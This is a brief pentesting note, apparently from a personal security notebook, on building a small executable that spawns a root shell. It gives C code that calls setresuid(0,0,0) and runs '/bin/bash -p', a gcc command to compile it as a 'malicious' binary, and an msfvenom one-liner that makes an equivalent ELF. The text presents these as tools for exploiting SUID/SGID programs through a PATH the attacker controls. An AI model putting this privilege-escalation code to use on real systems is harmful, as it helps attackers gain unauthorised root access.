# How to Load a Shell with a Simple Executable

* **author**:: Nathan Acks  
* **date**:: 2021-11-02

It's actually trivial to write a C program that loads up a shell.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void main() {
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

Compile with:

```bash
gcc -fPIC -o /path/to/malicious /path/to/malicious.c
```

Note that this is *almost* identical to the LD_PRELOAD trick; the differences are:

* Use `main()` instead of `_init()` as our entry point.
* Compile without -shared and -nostartfiles.

A simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.

* [Exploiting LD_PRELOAD](exploiting-ld-preload.md)

## Metasploit

The msfvenom tool can generate binaries with essentially the same functionality as above.

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf \
         -o shell.elf
```

* [Using Metasploit](metasploit.md)
